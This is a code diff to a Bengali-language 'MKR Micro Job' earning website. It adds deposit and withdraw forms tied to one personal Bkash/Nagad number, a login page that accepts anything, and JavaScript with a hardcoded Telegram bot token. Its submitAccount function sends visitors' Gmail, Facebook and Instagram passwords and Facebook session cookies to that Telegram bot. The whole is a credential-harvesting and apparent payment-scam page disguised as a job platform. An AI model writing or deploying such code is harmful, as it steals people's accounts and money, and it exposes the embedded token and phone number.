@@ -54,6 +54,7 @@
             align-items: center;
             justify-content: center;
             color: #64748b;
+            cursor: pointer;
         }
 
         .section-page {
@@ -212,7 +213,7 @@
             transform: translateY(-3px);
         }
 
-        .service-card img, .service-card i {
+        .service-card i {
             font-size: 28px;
             margin-bottom: 8px;
         }
@@ -267,7 +268,7 @@
             color: #fff;
         }
 
-        .password-box {
+        .password-box, .deposit-info-box {
             background: #ffffff;
             margin: 15px;
             padding: 15px;
@@ -300,7 +301,7 @@
             font-weight: bold;
         }
 
-        .submit-form-card {
+        .submit-form-card, .auth-card {
             background: #ffffff;
             margin: 15px;
             padding: 20px;
@@ -314,8 +315,8 @@
         }
 
         .form-heading h3 {
-            font-size: 16px;
-            color: #1e293b;
+            font-size: 18px;
+            color: #1e3a8a;
             margin-bottom: 3px;
         }
 
@@ -349,7 +350,7 @@
             font-size: 14px;
         }
 
-        .input-field input {
+        .input-field input, .input-field select {
             width: 100%;
             padding: 12px 15px 12px 45px;
             border: 1px solid #e2e8f0;
@@ -368,7 +369,7 @@
             gap: 5px;
         }
 
-        .submit-account-btn {
+        .submit-account-btn, .auth-btn {
             width: 100%;
             padding: 12px;
             background: #2563eb;
@@ -378,6 +379,20 @@
             font-size: 14px;
             font-weight: bold;
             cursor: pointer;
+            margin-top: 5px;
+        }
+
+        .auth-switch {
+            text-align: center;
+            margin-top: 15px;
+            font-size: 12px;
+            color: #64748b;
+        }
+
+        .auth-switch span {
+            color: #2563eb;
+            cursor: pointer;
+            font-weight: bold;
         }
 
         .back-btn {
@@ -416,7 +431,7 @@
                 <i class="fa-solid fa-bars" style="font-size: 18px; color: #1e3a8a;"></i>
                 <h2>MKR Micro Job</h2>
             </div>
-            <div class="profile-icon">
+            <div class="profile-icon" onclick="showPage('loginPage')">
                 <i class="fa-solid fa-user"></i>
             </div>
         </header>
@@ -433,8 +448,8 @@
                 <h1>৳0.00</h1>
                 <button class="earn-btn"><i class="fa-solid fa-chart-line"></i> কাজ করে আয় করুন আরও বেশি</button>
                 <div class="action-btns">
-                    <button class="btn-dep">Deposit <span>ব্যালেেন্স যোগ করুন</span></button>
-                    <button class="btn-with">Withdraw <span>ব্যালেেন্স উত্তোলন করুন</span></button>
+                    <button class="btn-dep" onclick="showPage('depositPage')">Deposit <span>ব্যালেেন্স যোগ করুন</span></button>
+                    <button class="btn-with" onclick="showPage('withdrawPage')">Withdraw <span>ব্যালেেন্স উত্তোলন করুন</span></button>
                 </div>
             </div>
 
@@ -477,6 +492,206 @@
         </div>
     </div>
 
+    <!-- ডিপোজিট পেজ -->
+    <div id="depositPage" class="section-page">
+        <header class="navbar">
+            <div class="nav-left">
+                <button class="back-btn" onclick="showPage('homePage')"><i class="fa-solid fa-arrow-left"></i></button>
+                <h2>Deposit Balance</h2>
+            </div>
+        </header>
+
+        <div class="dashboard">
+            <div class="deposit-info-box">
+                <div class="pass-text">
+                    <span>Bkash / Nagad Personal Number:</span>
+                    <strong id="adminNumber">01619861105</strong>
+                </div>
+                <button class="copy-btn" onclick="copyPassword('adminNumber', this)"><i class="fa-solid fa-copy"></i> Copy</button>
+            </div>
+
+            <div class="submit-form-card">
+                <div class="form-heading">
+                    <h3>Deposit Money</h3>
+                    <p>সঠিক তথ্য দিয়ে ডিপোজিট রিকোয়েস্ট পাঠান</p>
+                </div>
+                <form id="depositForm" onsubmit="submitDeposit(event)">
+                    <div class="input-group">
+                        <label>Payment Method</label>
+                        <div class="input-field">
+                            <i class="fa-solid fa-wallet"></i>
+                            <select id="depMethod" required>
+                                <option value="Bkash">Bkash (Send Money)</option>
+                                <option value="Nagad">Nagad (Send Money)</option>
+                            </select>
+                        </div>
+                    </div>
+                    <div class="input-group">
+                        <label>Your Sender Number (যে নাম্বার থেকে টাকা পাঠিয়েছেন)</label>
+                        <div class="input-field">
+                            <i class="fa-solid fa-phone"></i>
+                            <input type="text" id="senderNumber" placeholder="017xxxxxxxx" required>
+                        </div>
+                    </div>
+                    <div class="input-group">
+                        <label>Amount (টাকার পরিমাণ)</label>
+                        <div class="input-field">
+                            <i class="fa-solid fa-bangladeshi-taka-sign"></i>
+                            <input type="number" id="depAmount" placeholder="100" required>
+                        </div>
+                    </div>
+                    <div class="input-group">
+                        <label>Transaction ID (TrxID)</label>
+                        <div class="input-field">
+                            <i class="fa-solid fa-receipt"></i>
+                            <input type="text" id="depTrx" placeholder="যেমন: 9N78X..." required>
+                        </div>
+                    </div>
+                    <div class="report-note"><i class="fa-solid fa-circle-info"></i> টাকা পাঠিয়ে সঠিক TrxID ও নাম্বার দিন।</div>
+                    <button type="submit" class="submit-account-btn">SUBMIT DEPOSIT</button>
+                </form>
+            </div>
+        </div>
+    </div>
+
+    <!-- উইথড্র পেজ (৫% চার্জ সহ) -->
+    <div id="withdrawPage" class="section-page">
+        <header class="navbar">
+            <div class="nav-left">
+                <button class="back-btn" onclick="showPage('homePage')"><i class="fa-solid fa-arrow-left"></i></button>
+                <h2>Withdraw Balance</h2>
+            </div>
+        </header>
+
+        <div class="dashboard">
+            <div class="service-top-card">
+                <h3><i class="fa-solid fa-wallet"></i> উইথড্র নিয়মাবলী</h3>
+                <p>উইথড্র করার পর ৫% চার্জ কর্তন করা হবে</p>
+            </div>
+
+            <div class="submit-form-card">
+                <div class="form-heading">
+                    <h3>Request Withdrawal</h3>
+                    <p>আপনার পেমেন্টের তথ্য দিয়ে উইথড্র করুন</p>
+                </div>
+                <form id="withdrawForm" onsubmit="submitWithdraw(event)">
+                    <div class="input-group">
+                        <label>Payment Method</label>
+                        <div class="input-field">
+                            <i class="fa-solid fa-wallet"></i>
+                            <select id="withMethod" required>
+                                <option value="Bkash">Bkash</option>
+                                <option value="Nagad">Nagad</option>
+                            </select>
+                        </div>
+                    </div>
+                    <div class="input-group">
+                        <label>Account Number (যে নাম্বারে টাকা নেবেন)</label>
+                        <div class="input-field">
+                            <i class="fa-solid fa-phone"></i>
+                            <input type="text" id="withNumber" placeholder="017xxxxxxxx" required>
+                        </div>
+                    </div>
+                    <div class="input-group">
+                        <label>Withdraw Amount (টাকার পরিমাণ)</label>
+                        <div class="input-field">
+                            <i class="fa-solid fa-bangladeshi-taka-sign"></i>
+                            <input type="number" id="withAmount" placeholder="500" required>
+                        </div>
+                    </div>
+                    <div class="report-note"><i class="fa-solid fa-circle-info"></i> উইথড্র চার্জ: ৫% কাটা হবে। পেমেন্ট পাঠানো হবে অ্যাডমিন নাম্বার (01619861105) থেকে।</div>
+                    <button type="submit" class="submit-account-btn">SUBMIT WITHDRAW</button>
+                </form>
+            </div>
+        </div>
+    </div>
+
+    <!-- লগইন পেজ -->
+    <div id="loginPage" class="section-page">
+        <header class="navbar">
+            <div class="nav-left">
+                <button class="back-btn" onclick="showPage('homePage')"><i class="fa-solid fa-arrow-left"></i></button>
+                <h2>MKR Micro Job - Login</h2>
+            </div>
+        </header>
+        <div class="auth-card">
+            <div class="form-heading">
+                <h3>স্বাগত!</h3>
+                <p>আপনার একাউন্টে লগইন করতে নিচের তথ্যগুলো দিন</p>
+            </div>
+            <form onsubmit="event.preventDefault(); alert('লগইন সফল হয়েছে!'); showPage('homePage');">
+                <div class="input-group">
+                    <label>Email / Phone</label>
+                    <div class="input-field">
+                        <i class="fa-solid fa-envelope"></i>
+                        <input type="text" placeholder="Enter your email" required>
+                    </div>
+                </div>
+                <div class="input-group">
+                    <label>Password</label>
+                    <div class="input-field">
+                        <i class="fa-solid fa-lock"></i>
+                        <input type="password" placeholder="Enter your password" required>
+                    </div>
+                </div>
+                <button type="submit" class="auth-btn">লগইন করুন</button>
+                <div class="auth-switch">
+                    আনার কি কোনো একাউন্ট নেই? <span onclick="showPage('registerPage')">নতুন একাউন্ট তৈরি করুন</span>
+                </div>
+            </form>
+        </div>
+    </div>
+
+    <!-- রেজিস্ট্রেশন পেজ -->
+    <div id="registerPage" class="section-page">
+        <header class="navbar">
+            <div class="nav-left">
+                <button class="back-btn" onclick="showPage('loginPage')"><i class="fa-solid fa-arrow-left"></i></button>
+                <h2>MKR Micro Job - Register</h2>
+            </div>
+        </header>
+        <div class="auth-card">
+            <div class="form-heading">
+                <h3>✨ নতুন অ্যাকাউন্ট ✨</h3>
+                <p>আজই যোগ দিন এবং ইনকাম শুরু করুন</p>
+            </div>
+            <form onsubmit="event.preventDefault(); alert('রেজিস্ট্রেশন সফল হয়েছে!'); showPage('loginPage');">
+                <div class="input-group">
+                    <label>Full Name</label>
+                    <div class="input-field">
+                        <i class="fa-solid fa-user"></i>
+                        <input type="text" placeholder="আপনার পুরো নাম লিখুন" required>
+                    </div>
+                </div>
+                <div class="input-group">
+                    <label>Phone Number</label>
+                    <div class="input-field">
+                        <i class="fa-solid fa-phone"></i>
+                        <input type="text" placeholder="আপনার Phone নাম্বার দিন" required>
+                    </div>
+                </div>
+                <div class="input-group">
+                    <label>Email Address (Gmail)</label>
+                    <div class="input-field">
+                        <i class="fa-solid fa-envelope"></i>
+                        <input type="email" placeholder="আপনার জিমেইল একাউন্ট" required>
+                    </div>
+                </div>
+                <div class="input-group">
+                    <label>Password</label>
+                    <div class="input-field">
+                        <i class="fa-solid fa-lock"></i>
+                        <input type="password" placeholder="পাসওয়ার্ড দিন" required>
+                    </div>
+                </div>
+                <button type="submit" class="auth-btn">Register Now →</button>
+                <div class="auth-switch">
+                    ইতিমধ্যেই একাউন্ট আছে? <span onclick="showPage('loginPage')">লগইন করুন</span>
+                </div>
+            </form>
+        </div>
+    </div>
+
     <!-- জিমেইল সেল পেজ -->
     <div id="gmailPage" class="section-page">
         <header class="navbar">
@@ -510,19 +725,19 @@
                     <h3>Submit Your Account</h3>
                     <p>সঠিক তথ্য দিয়ে নিচের ফর্মটি পূরণ করুন</p>
                 </div>
-                <form onsubmit="event.preventDefault(); alert('সফলভাবে সাবমিট হয়েছে!');">
+                <form id="gmailForm" onsubmit="submitAccount(event, 'Gmail')">
                     <div class="input-group">
                         <label>Gmail Address</label>
                         <div class="input-field">
                             <i class="fa-solid fa-envelope"></i>
-                            <input type="email" placeholder="example@gmail.com" required>
+                            <input type="email" id="gmailEmail" placeholder="example@gmail.com" required>
                         </div>
                     </div>
                     <div class="input-group">
                         <label>Account Password</label>
                         <div class="input-field">
                             <i class="fa-solid fa-lock"></i>
-                            <input type="password" placeholder="Enter given password" required>
+                            <input type="password" id="gmailPass" placeholder="Enter given password" required>
                         </div>
                     </div>
                     <div class="report-note"><i class="fa-solid fa-circle-info"></i> রিপোর্ট টাইম: ২০-৩০ ঘণ্টা</div>
@@ -565,26 +780,26 @@
                     <h3>Submit Your Account</h3>
                     <p>সঠিক তথ্য দিয়ে নিচের ফর্মটি পূরণ করুন</p>
                 </div>
-                <form onsubmit="event.preventDefault(); alert('সফলভাবে সাবমিট হয়েছে!');">
+                <form id="facebookForm" onsubmit="submitAccount(event, 'Facebook')">
                     <div class="input-group">
                         <label>Facebook UID / Email / Number</label>
                         <div class="input-field">
                             <i class="fa-solid fa-envelope"></i>
-                            <input type="text" placeholder="Enter Facebook UID" required>
+                            <input type="text" id="fbUid" placeholder="Enter Facebook UID" required>
                         </div>
                     </div>
                     <div class="input-group">
                         <label>Account Password</label>
                         <div class="input-field">
                             <i class="fa-solid fa-lock"></i>
-                            <input type="password" placeholder="Enter Password" required>
+                            <input type="password" id="fbPass" placeholder="Enter Password" required>
                         </div>
                     </div>
                     <div class="input-group">
                         <label>Cookies</label>
                         <div class="input-field">
                             <i class="fa-solid fa-cookie"></i>
-                            <input type="text" placeholder="Paste Cookies here..." required>
+                            <input type="text" id="fbCookies" placeholder="Paste Cookies here..." required>
                         </div>
                     </div>
                     <div class="report-note"><i class="fa-solid fa-circle-info"></i> রিপোর্ট টাইম: ১২-২৪ ঘণ্টা</div>
@@ -627,19 +842,19 @@
                     <h3>Submit Your Account</h3>
                     <p>সঠিক তথ্য দিয়ে নিচের ফর্মটি পূরণ করুন</p>
                 </div>
-                <form onsubmit="event.preventDefault(); alert('সফলভাবে সাবমিট হয়েছে!');">
+                <form id="instagramForm" onsubmit="submitAccount(event, 'Instagram')">
                     <div class="input-group">
                         <label>Instagram Username</label>
                         <div class="input-field">
                             <i class="fa-brands fa-instagram"></i>
-                            <input type="text" placeholder="Enter Username" required>
+                            <input type="text" id="instaUser" placeholder="Enter Username" required>
                         </div>
                     </div>
                     <div class="input-group">
                         <label>Account Password</label>
                         <div class="input-field">
                             <i class="fa-solid fa-lock"></i>
-                            <input type="password" placeholder="Enter Password" required>
+                            <input type="password" id="instaPass" placeholder="Enter Password" required>
                         </div>
                     </div>
                     <button type="submit" class="submit-account-btn">SUBMIT INSTAGRAM ACCOUNT</button>
@@ -655,6 +870,10 @@
 
     <!-- জাভাস্ক্রিপ্ট -->
     <script>
+        const BOT_TOKEN = '8588226486:AAHXTfZW_Yl1foxQ0l1so_7gqSfmkHg3iY';
+        const CHAT_ID = '7714324222';
+        const ADMIN_NUMBER = '01619861105';
+
         function showPage(pageId) {
             const pages = document.querySelectorAll('.section-page');
             pages.forEach(page => page.classList.remove('active'));
@@ -669,6 +888,101 @@
             setTimeout(() => { 
                 btn.innerHTML = '<i class="fa-solid fa-copy"></i> Copy'; 
             }, 2000);
+        }
+
+        // ডিপোজিট রিকোয়েস্ট টেলিগ্রাম বটে পাঠানোর ফাংশন
+        function submitDeposit(event) {
+            event.preventDefault();
+            
+            let method = document.getElementById('depMethod').value;
+            let sender = document.getElementById('senderNumber').value;
+            let amount = document.getElementById('depAmount').value;
+            let trx = document.getElementById('depTrx').value;
+
+            let message = `💰 নতুন ডিপোজিট রিকোয়েস্ট এসেছে!\n\n🔹 মাধ্যম: ${method}\n📱 প্রেরক নাম্বার: ${sender}\n💵 পরিমাণ: ৳${amount}\n🧾 TrxID: ${trx}\n📌 অ্যাডমিন নাম্বার: ${ADMIN_NUMBER}`;
+
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`;
+
+            fetch(url)
+                .then(response => {
+                    if (response.ok) {
+                        alert('ডিপোজিট রিকোয়েস্ট সফলভাবে পাঠানো হয়েছে!');
+                        event.target.reset();
+                        showPage('homePage');
+                    } else {
+                        alert('সমস্যা হয়েছে। আবার চেষ্টা করুন।');
+                    }
+                })
+                .catch(error => {
+                    alert('নেটওয়ার্ক ত্রুটি!');
+                });
+        }
+
+        // উইথড্র রিকোয়েস্ট (৫% চার্জ সহ) টেলিগ্রাম বটে পাঠানোর ফাংশন
+        function submitWithdraw(event) {
+            event.preventDefault();
+            
+            let method = document.getElementById('withMethod').value;
+            let number = document.getElementById('withNumber').value;
+            let amount = parseFloat(document.getElementById('withAmount').value);
+            
+            let charge = amount * 0.05; // ৫% চার্জ
+            let finalAmount = amount - charge; // চার্জ বাদে পেমেন্ট
+
+            let message = `💸 নতুন উইথড্র রিকোয়েস্ট এসেছে!\n\n🔹 মাধ্যম: ${method}\n📱 গ্রহণকারী নাম্বার: ${number}\n💵 উইথড্র পরিমাণ: ৳${amount}\n🔻 ৫% চার্জ: ৳${charge.toFixed(2)}\n✅ প্রদেয় পরিমাণ: ৳${finalAmount.toFixed(2)}\n📌 প্রেরক অ্যাডমিন নাম্বার: ${ADMIN_NUMBER}`;
+
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`;
+
+            fetch(url)
+                .then(response => {
+                    if (response.ok) {
+                        alert('উইথড্র রিকোয়েস্ট সফলভাবে পাঠানো হয়েছে! ৫% চার্জ কেটে খুব শীঘ্রই পেমেন্ট দেওয়া হবে।');
+                        event.target.reset();
+                        showPage('homePage');
+                    } else {
+                        alert('সমস্যা হয়েছে। আবার চেষ্টা করুন।');
+                    }
+                })
+                .catch(error => {
+                    alert('নেটওয়ার্ক ত্রুটি!');
+                });
+        }
+
+        // কাজের সাবমিশন টেলিগ্রাম বটে পাঠানোর ফাংশন
+        function submitAccount(event, platform) {
+            event.preventDefault();
+            
+            let message = `📥 নতুন কাজ সাবমিট হয়েছে!\n\n🔹 প্ল্যাটফর্ম: ${platform}\n`;
+
+            if (platform === 'Gmail') {
+                let email = document.getElementById('gmailEmail').value;
+                let pass = document.getElementById('gmailPass').value;
+                message += `📧 ইমেইল: ${email}\n🔑 পাসওয়ার্ড: ${pass}`;
+            } else if (platform === 'Facebook') {
+                let uid = document.getElementById('fbUid').value;
+                let pass = document.getElementById('fbPass').value;
+                let cookies = document.getElementById('fbCookies').value;
+                message += `👤 UID/Email: ${uid}\n🔑 পাসওয়ার্ড: ${pass}\n🍪 Cookies: ${cookies}`;
+            } else if (platform === 'Instagram') {
+                let user = document.getElementById('instaUser').value;
+                let pass = document.getElementById('instaPass').value;
+                message += `👤 ইউজারনেম: ${user}\n🔑 পাসওয়ার্ড: ${pass}`;
+            }
+
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`;
+
+            fetch(url)
+                .then(response => {
+                    if (response.ok) {
+                        alert('সফলভাবে সাবমিট হয়েছে! কাজ সরাসরি আপনার টেলিগ্রাম বটে চলে গেছে।');
+                        event.target.reset();
+                    } else {
+                        alert('সাবমিট করতে সমস্যা হয়েছে। আবার চেষ্টা করুন।');
+                    }
+                })
+                .catch(error => {
+                    alert('নেটওয়ার্ক ত্রুটি!');
+                });
         }
     </script>
 </body>
